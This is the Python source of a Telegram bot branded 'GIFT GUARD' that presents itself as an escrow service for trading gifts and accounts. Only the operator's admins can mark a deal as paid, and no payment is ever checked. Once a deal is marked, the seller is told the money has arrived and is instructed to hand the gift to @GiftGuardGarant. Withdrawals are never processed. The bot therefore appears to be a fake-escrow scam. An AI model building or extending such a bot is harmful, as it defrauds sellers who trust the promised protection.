import asyncio
import logging
import json
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    CallbackQuery,
    Message,
    FSInputFile,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
from aiogram.utils.keyboard import InlineKeyboardBuilder

from config import BOT_TOKEN, BOT_USERNAME, SUPER_ADMIN_IDS
from database import db
from states import DealStates, RequisitesStates, ScamStates, WithdrawStates, AdminStates
from keyboards import (
    main_menu,
    deal_type_menu,
    currency_menu,
    requisites_edit_menu,
    scam_base_menu,
    back_menu,
    deal_confirm_menu,
)
from utils import format_amount, get_rating_stars

# Настройка логирования
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

# ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================

async def send_main_menu(target, user_id: int, username: str, first_name: str):
    user_data = db.get_user(user_id)
    rating = user_data[7] if user_data else 5.0
    deals_count = user_data[5] if user_data else 0
    stats = db.get_stats()
    total_paid = stats[1] if stats else 0
    
    is_super = user_id in SUPER_ADMIN_IDS
    markup = main_menu(is_super_admin=is_super)

    text = f"""
<b>🛡️ GIFT GUARD</b>

Привет, {first_name}!
<b>Рейтинг:</b> {get_rating_stars(rating)} ({rating:.1f}/5) | <b>Сделок:</b> {deals_count}

Добро пожаловать в гарант-сервис для безопасных сделок!
GIFT GUARD — сервис, который предоставляет возможность <b>безопасно</b> продавать и покупать любые товары. Мы обеспечиваем <b>защиту обеих сторон</b>, прозрачные условия и <b>быстрые выплаты</b>.

---

<b>Статистика:</b>
- Выплачено: {format_amount(total_paid)} RUB
- Комиссия сервиса: 1.5%

Нажмите кнопки ниже, чтобы начать!
"""

    try:
        photo = FSInputFile("main.png")
        if isinstance(target, Message):
            await target.answer_photo(
                photo=photo, caption=text, parse_mode="HTML", reply_markup=markup
            )
        elif isinstance(target, CallbackQuery):
            await target.message.answer_photo(
                photo=photo, caption=text, parse_mode="HTML", reply_markup=markup
            )
            try:
                await target.message.delete()
            except:
                pass
    except Exception as e:
        logger.error(f"Error sending main menu: {e}")
        if isinstance(target, Message):
            await target.answer(
                text=text, parse_mode="HTML", reply_markup=markup
            )
        elif isinstance(target, CallbackQuery):
            await target.message.answer(
                text=text, parse_mode="HTML", reply_markup=markup
            )
            try:
                await target.message.delete()
            except:
                pass

# ==================== ОБРАБОТЧИКИ ====================

dp = Dispatcher(storage=MemoryStorage())

@dp.message(Command("start"))
async def cmd_start(message: Message, command: CommandObject):
    user = message.from_user
    db.save_user(user.id, user.username, user.first_name)

    if command.args:
        deal_id = command.args.replace("deal_", "")
        deal = db.get_deal(deal_id)

        if deal and deal["status"] == "waiting":
            db.set_buyer(deal_id, user.id)
            deal = db.get_deal(deal_id)
            amount_str = format_amount(deal["amount"])
            seller = db.get_user(deal["seller_id"])

            text = f"""
📋 <b>СДЕЛКА #{deal["deal_id"]}</b>

👤 <b>Продавец:</b> {seller[2] if seller else "Пользователь"} @{seller[1] if seller else "no_username"}
📦 <b>Тип:</b> {deal["deal_type"]}
💰 <b>Сумма:</b> {amount_str} {deal["currency"]}

<b>Статус:</b> {"🟡 Ожидает оплаты" if deal["status"] == "waiting" else "🔵 Оплачено"}
"""
            builder = InlineKeyboardBuilder()
            all_admins = SUPER_ADMIN_IDS + db.get_admins()
            if user.id in all_admins:
                builder.row(
                    InlineKeyboardButton(
                        text="✅ Я оплатил", callback_data=f"pay_{deal_id}"
                    )
                )
            builder.row(
                InlineKeyboardButton(text="◀️ Назад в меню", callback_data="menu")
            )

            await message.answer(
                text, parse_mode="HTML", reply_markup=builder.as_markup()
            )
            return

    await send_main_menu(message, user.id, user.username, user.first_name)

@dp.callback_query(F.data == "new_deal")
async def new_deal_handler(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.answer(
        "Выберите тип сделки:", reply_markup=deal_type_menu()
    )
    try:
        await callback.message.delete()
    except:
        pass
    await state.set_state(DealStates.waiting_deal_type)

@dp.callback_query(F.data == "profile")
async def profile_handler(callback: CallbackQuery):
    user_data = db.get_user(callback.from_user.id)
    if not user_data:
        db.save_user(
            callback.from_user.id,
            callback.from_user.username,
            callback.from_user.first_name,
        )
        user_data = db.get_user(callback.from_user.id)

    rating = user_data[7]
    deals_count = user_data[5] + user_data[6]
    balance = user_data[3]
    frozen = user_data[4]

    text = f"""
👤 <b>Профиль пользователя</b>

<b>ID:</b> <code>{callback.from_user.id}</code>
<b>Имя:</b> {callback.from_user.first_name}
<b>Username:</b> @{callback.from_user.username}

<b>Рейтинг:</b> {get_rating_stars(rating)} ({rating:.1f}/5)
<b>Всего сделок:</b> {deals_count}

💰 <b>Баланс:</b> {format_amount(balance)} RUB
❄️ <b>Заморожено:</b> {format_amount(frozen)} RUB
"""
    await callback.answer()
    await callback.message.answer(
        text, parse_mode="HTML", reply_markup=back_menu()
    )
    try:
        await callback.message.delete()
    except:
        pass

@dp.callback_query(DealStates.waiting_deal_type, F.data.startswith("type_"))
async def deal_type_selected(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    type_key = callback.data.split("_")[1]
    type_map = {"gift": "Подарок", "account": "Аккаунт", "other": "Другое"}
    deal_type = type_map.get(type_key, "Другое")
    await state.update_data(deal_type=deal_type)

    text = f"<b>Введите описание товара</b> (Тип: {deal_type}):"
    if deal_type == "Подарок":
        text += "\n\n<i>ВНИМАНИЕ! Для типа 'Подарок':\nПосле подтверждения оплаты вы должны передать подарок покупателю.</i>"

    await callback.message.answer(text, parse_mode="HTML", reply_markup=back_menu())
    try:
        await callback.message.delete()
    except:
        pass
    await state.set_state(DealStates.waiting_description)

@dp.message(DealStates.waiting_description, F.text)
async def get_description(message: Message, state: FSMContext):
    await state.update_data(description=message.text)
    await message.answer(
        "<b>Введите сумму сделки:</b>\nПример: 15000",
        parse_mode="HTML",
        reply_markup=back_menu(),
    )
    await state.set_state(DealStates.waiting_amount)

@dp.message(DealStates.waiting_amount, F.text)
async def get_amount(message: Message, state: FSMContext):
    try:
        amount = float(message.text.replace(",", "."))
        if amount <= 0:
            raise ValueError
    except:
        await message.answer(
            "❌ Введите корректную сумму (положительное число):",
            reply_markup=back_menu(),
        )
        return

    await state.update_data(amount=amount)
    await message.answer(
        f"<b>Выберите валюту для суммы {format_amount(amount)}:</b>",
        parse_mode="HTML",
        reply_markup=currency_menu(),
    )
    await state.set_state(DealStates.waiting_currency)

@dp.callback_query(DealStates.waiting_currency, F.data.startswith("cur_"))
async def get_currency(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    currency = callback.data.split("_")[1]
    data = await state.get_data()
    deal_type = data.get("deal_type")
    description = data.get("description")
    amount = data.get("amount")

    deal_id = db.create_deal(callback.from_user.id, deal_type, description, amount, currency)
    link = f"https://t.me/{BOT_USERNAME}?start=deal_{deal_id}"
    amount_str = format_amount(amount)

    text = f"""
✅ <b>Сделка успешно создана!</b>

<b>Тип:</b> {deal_type}
<b>Товар:</b> {description}
<b>Сумма:</b> {amount_str} {currency}

<b>ID сделки:</b> {deal_id}

---

<b>Ссылка для покупателя:</b>
<code>{link}</code>

⚠️ <b>Передавайте товар только после получения уведомления об оплате!</b>
"""
    await callback.message.answer(text, parse_mode="HTML", reply_markup=back_menu())
    try:
        await callback.message.delete()
    except:
        pass
    await state.clear()

@dp.callback_query(F.data == "requisites")
async def requisites_handler(callback: CallbackQuery):
    user_data = db.get_user(callback.from_user.id)
    requisites = json.loads(user_data[8]) if user_data and user_data[8] else {}

    text = "💳 <b>Ваши реквизиты для вывода:</b>\n\n"
    type_names = {"card": "Карта", "kaspi": "Kaspi", "qiwi": "QIWI", "yoomoney": "ЮMoney", "webmoney": "WebMoney"}

    for req_type, name in type_names.items():
        val = requisites.get(req_type, "<i>не указано</i>")
        text += f"• <b>{name}:</b> {val}\n"

    text += "\nВыберите тип для изменения:"
    await callback.answer()
    await callback.message.answer(text, parse_mode="HTML", reply_markup=requisites_edit_menu())
    try:
        await callback.message.delete()
    except:
        pass

@dp.callback_query(F.data == "scam_base")
async def scam_base_handler(callback: CallbackQuery):
    await callback.answer()
    await callback.message.answer("Выберите действие:", reply_markup=scam_base_menu())
    try:
        await callback.message.delete()
    except:
        pass

@dp.callback_query(F.data == "my_deals")
async def my_deals_handler(callback: CallbackQuery):
    deals = db.get_user_deals(callback.from_user.id)
    if not deals:
        await callback.answer()
        await callback.message.answer("📋 <b>У вас пока нет сделок</b>", parse_mode="HTML", reply_markup=back_menu())
        try:
            await callback.message.delete()
        except:
            pass
        return

    text = "📋 <b>Ваши последние сделки:</b>\n\n"
    for deal in deals[:10]:
        status_emoji = "⏳" if deal[7] == "waiting" else "✅"
        text += f"{status_emoji} #{deal[0]} | {deal[3]} | {format_amount(deal[5])} {deal[6]}\n"

    await callback.answer()
    await callback.message.answer(text, parse_mode="HTML", reply_markup=back_menu())
    try:
        await callback.message.delete()
    except:
        pass

@dp.callback_query(F.data == "withdraw")
async def withdraw_handler(callback: CallbackQuery):
    user_data = db.get_user(callback.from_user.id)
    available = user_data[3] if user_data else 0

    text = f"""
💰 <b>Вывод средств</b>

<b>Доступно для вывода:</b> {format_amount(available)} RUB
<b>Минимальная сумма:</b> 100 RUB

Для вывода средств у вас должны быть заполнены реквизиты.
"""
    await callback.answer()
    await callback.message.answer(text, parse_mode="HTML", reply_markup=back_menu())
    try:
        await callback.message.delete()
    except:
        pass
    if available > 0:
        await callback.message.answer(f"💰 <b>Доступно для вывода:</b> {format_amount(available)} RUB\n\nВведите сумму для вывода:", parse_mode="HTML")

@dp.callback_query(F.data.startswith("req_"))
async def requisites_edit_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    req_type = callback.data[4:]
    type_names = {"card": "Карта", "kaspi": "Kaspi", "qiwi": "QIWI", "yoomoney": "ЮMoney", "webmoney": "WebMoney"}
    await state.update_data(req_type=req_type)
    await callback.message.answer(f"<b>{type_names[req_type]}</b>\n\nВведите реквизиты:", parse_mode="HTML", reply_markup=back_menu())
    try:
        await callback.message.delete()
    except:
        pass
    await state.set_state(RequisitesStates.waiting_value)

@dp.message(RequisitesStates.waiting_value, F.text)
async def get_requisite_value(message: Message, state: FSMContext):
    data = await state.get_data()
    req_type = data.get("req_type")
    db.update_requisites(message.from_user.id, req_type, message.text)
    await message.answer(f"✅ Реквизиты сохранены!", reply_markup=back_menu())
    await state.clear()

@dp.callback_query(F.data.startswith("pay_"))
async def pay_deal_handler(callback: CallbackQuery, bot: Bot):
    all_admins = SUPER_ADMIN_IDS + db.get_admins()
    if callback.from_user.id not in all_admins:
        return await callback.answer("У вас нет прав для подтверждения оплаты!", show_alert=True)

    await callback.answer()
    deal_id = callback.data.replace("pay_", "")
    deal = db.get_deal(deal_id)

    if deal and deal["status"] == "waiting":
        db.mark_paid(deal_id)
        amount_str = format_amount(deal["amount"])

        await callback.message.answer(f"✅ <b>Оплата по сделке #{deal_id} отмечена!</b>", parse_mode="HTML", reply_markup=back_menu())
        try:
            await callback.message.delete()
        except:
            pass

        await bot.send_message(
            deal["seller_id"],
            f"💰 <b>Покупатель оплатил сделку #{deal_id}</b>\n\n"
            f"📦 <b>Тип:</b> {deal['deal_type']}\n"
            f"📋 <b>Товар:</b> {deal['description']}\n"
            f"💵 <b>Сумма:</b> +{amount_str} 💸 {deal['currency']}\n\n"
            f"👤 <b>Покупатель:</b> ID {callback.from_user.id}\n\n"
            f"<i>✅ Деньги поступили. Можете передавать товар/подарок.</i>\n\n"
            f"🎁 <b>ИНСТРУКЦИЯ ПО ПЕРЕДАЧЕ ПОДАРКА</b>\n\n"
            f"1. 📦 Передайте подарок гаранту: @GiftGuardGarant\n"
            f"2. ✅ Передача подтвержаеся автоматически\n"
            f"3. 💰 После подтверждения средства будут зачислены на ваш баланс",
            parse_mode="HTML",
            reply_markup=back_menu(),
        )

@dp.callback_query(F.data == "menu")
async def menu_handler(callback: CallbackQuery):
    await callback.answer()
    await send_main_menu(callback, callback.from_user.id, callback.from_user.username, callback.from_user.first_name)

# ==================== АДМИН ПАНЕЛЬ ====================

@dp.callback_query(F.data == "admin_list")
async def admin_list_handler(callback: CallbackQuery):
    if callback.from_user.id not in SUPER_ADMIN_IDS:
        return await callback.answer("У вас нет прав!", show_alert=True)
    
    admins = db.get_admins()
    text = "👥 <b>Список обычных администраторов:</b>\n\n"
    if not admins:
        text += "<i>Список пуст</i>"
    else:
        for i, admin_id in enumerate(admins, 1):
            text += f"{i}. <code>{admin_id}</code>\n"
    
    await callback.message.answer(text, parse_mode="HTML", reply_markup=back_menu())
    try:
        await callback.message.delete()
    except:
        pass

@dp.callback_query(F.data == "admin_add")
async def admin_add_start(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in SUPER_ADMIN_IDS:
        return await callback.answer("У вас нет прав!", show_alert=True)
    
    await callback.message.answer("Введите Telegram ID пользователя, которого хотите сделать админом:", reply_markup=back_menu())
    await state.set_state(AdminStates.waiting_admin_id_add)
    try:
        await callback.message.delete()
    except:
        pass

@dp.message(AdminStates.waiting_admin_id_add, F.text)
async def admin_add_finish(message: Message, state: FSMContext):
    if message.from_user.id not in SUPER_ADMIN_IDS:
        return
    
    try:
        admin_id = int(message.text)
        db.add_admin(admin_id)
        await message.answer(f"✅ Пользователь <code>{admin_id}</code> назначен администратором!", parse_mode="HTML", reply_markup=back_menu())
        await state.clear()
    except ValueError:
        await message.answer("❌ Введите корректный числовой ID!")

@dp.callback_query(F.data == "admin_remove")
async def admin_remove_start(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in SUPER_ADMIN_IDS:
        return await callback.answer("У вас нет прав!", show_alert=True)
    
    await callback.message.answer("Введите Telegram ID пользователя, которого хотите удалить из админов:", reply_markup=back_menu())
    await state.set_state(AdminStates.waiting_admin_id_remove)
    try:
        await callback.message.delete()
    except:
        pass

@dp.message(AdminStates.waiting_admin_id_remove, F.text)
async def admin_remove_finish(message: Message, state: FSMContext):
    if message.from_user.id not in SUPER_ADMIN_IDS:
        return
    
    try:
        admin_id = int(message.text)
        db.remove_admin(admin_id)
        await message.answer(f"✅ Пользователь <code>{admin_id}</code> удален из списка администраторов!", parse_mode="HTML", reply_markup=back_menu())
        await state.clear()
    except ValueError:
        await message.answer("❌ Введите корректный числовой ID!")

@dp.callback_query(F.data == "admin_broadcast")
async def admin_broadcast_start(callback: CallbackQuery, state: FSMContext):
    if callback.from_user.id not in SUPER_ADMIN_IDS:
        return await callback.answer("У вас нет прав!", show_alert=True)
    
    await callback.message.answer("Введите сообщение для рассылки всем пользователям:", reply_markup=back_menu())
    await state.set_state(AdminStates.waiting_broadcast_msg)
    try:
        await callback.message.delete()
    except:
        pass

@dp.message(AdminStates.waiting_broadcast_msg, F.text)
async def admin_broadcast_finish(message: Message, state: FSMContext, bot: Bot):
    if message.from_user.id not in SUPER_ADMIN_IDS:
        return
    
    users = db.get_all_users()
    count = 0
    await message.answer(f"🚀 Начинаю рассылку на {len(users)} пользователей...")
    
    for user_id in users:
        try:
            await bot.send_message(user_id, message.text, parse_mode="HTML")
            count += 1
            await asyncio.sleep(0.05) # Защита от флуда
        except:
            pass
    
    await message.answer(f"✅ Рассылка завершена! Получили: {count} пользователей.", reply_markup=back_menu())
    await state.clear()

async def main():
    bot = Bot(token=BOT_TOKEN)
    print("✅ GIFT GUARD бот запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
